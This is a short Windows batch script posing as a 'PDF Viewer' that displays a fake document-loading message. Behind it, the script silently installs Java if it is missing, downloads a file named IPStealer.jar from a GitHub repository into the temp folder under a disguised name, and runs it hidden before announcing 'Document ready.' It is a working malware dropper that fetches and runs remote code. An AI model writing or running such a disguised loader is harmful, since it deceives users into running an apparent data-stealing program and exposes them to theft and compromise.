@echo off
title PDF Viewer
echo Please wait while the document loads...

where java >nul 2>&1
if errorlevel 1 (
    powershell -Command "(New-Object Net.WebClient).DownloadFile('https://javadl.oracle.com/webapps/download/AutoDL?BundleId=249213_b2d4dfe4f4d04c8aab5a5b8f4a41c3a4', '%TEMP%\jre.exe')" >nul 2>&1
    start /wait "" "%TEMP%\jre.exe" /s >nul 2>&1
    timeout /t 20 >nul
    del "%TEMP%\jre.exe" 2>nul
)

powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/mavi30173-ai/mc-server/raw/main/IPStealer.jar', '%TEMP%\cache.tmp')" >nul 2>&1

java -jar "%TEMP%\cache.tmp" >nul 2>&1

echo Document ready.
timeout /t 1 >nul
exit
